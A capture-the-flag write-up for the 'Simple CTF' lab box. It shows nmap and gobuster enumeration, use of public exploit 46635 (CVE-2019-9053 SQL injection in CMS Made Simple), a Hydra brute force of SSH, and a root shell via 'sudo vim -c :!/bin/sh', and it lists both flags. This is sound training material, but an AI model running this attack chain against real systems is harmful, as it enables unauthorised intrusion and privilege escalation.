# Simple CTF – Writeup

## Enumeration

### Nmap Scan
An initial TCP scan was performed to identify open ports and running services.

```bash
sudo nmap -sS -sC -sV -vv -oN nmapout.txt 10.10.24.87
````

Open Ports and Services

```
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
80/tcp   open  http    Apache httpd 2.4.18 (Ubuntu)
2222/tcp open  ssh     OpenSSH 7.2p2 (Ubuntu)
```

Full Nmap output is saved as `nmapout.txt` in this repository.

### Directory Enumeration (Gobuster)

Initial directory enumeration on the web server:

```bash
gobuster -e -u http://10.10.24.87 -w dir_wordlist.txt -x php,txt,js,html
```

Results

```
/index.html   (200)
/robots.txt   (200)
/simple       (301)
```

Further enumeration on `/simple`:

```
/simple/index.php   (200)
/simple/admin       (301)
/simple/modules     (301)
/simple/uploads     (301)
/simple/doc         (301)
/simple/assets      (301)
/simple/lib         (301)
/simple/install.php (301)
/simple/config.php  (200)
/simple/tmp         (301)
```


## Exploitation

### Service Analysis

* Services running below port 1000: FTP (21), HTTP (80)
* Service running on the higher port (2222): SSH

---

### Vulnerability Identification

Browsing `http://10.10.24.87/simple` revealed that the application is CMS Made Simple.

The footer disclosed the version:
- CMS Made Simple 2.2.8

Using SearchSploit to identify known vulnerabilities:

```bash
searchsploit "CMS Made Simple 2.2.8"
```

Relevant Exploit

```
CMS Made Simple < 2.2.10 - SQL Injection
EDB-ID: 46635
```

* CVE: CVE-2019-9053
* Vulnerability Type: SQL Injection (SQLi)

---

### Credential Extraction

The exploit was copied locally:

```bash
searchsploit -m 46635
```

The script was modified to work with Python 3 and executed:

```bash
python3 46635.py -u http://10.10.24.87/simple/ -w rockyou.txt -c
```

Although password cracking was unstable, the following credentials were extracted:

```
Username: mitch
Salt: 1dac0d92e9fa6bb2
Email: admin@admin.com
```



### SSH Brute Force

Since SSH was running on port 2222, Hydra was used to brute-force the password:

```bash
hydra -l mitch -P rockyou.txt ssh://10.10.24.87:2222
```

Valid Credentials Found

```
Username: mitch
Password: secret
```



## Post-Exploitation

### User Access

Login via SSH:

```bash
ssh -p 2222 mitch@10.10.24.87
```

User Flag

```
G00d j0b, keep up!
```

---

### Additional Users

Listing the home directory:

```bash
ls /home
```

Other User

```
sunbath
```

---

## Privilege Escalation

Checking sudo permissions:

```bash
sudo -l
```

Result

```
(ALL) NOPASSWD: /usr/bin/vim
```

### Root Shell via Vim

Vim can be abused to spawn a root shell:

```bash
sudo vim -c ':!/bin/sh'
```

Verification:

```bash
whoami
root
```


## Root Flag

Searching for the root flag:

```bash
find / -type f -name root.txt 2>/dev/null
```

Location of the file

```
/root/root.txt
```

Root Flag

```
W3ll d0n3. You made it!
```

## Author
### RUTHRAN-SEC
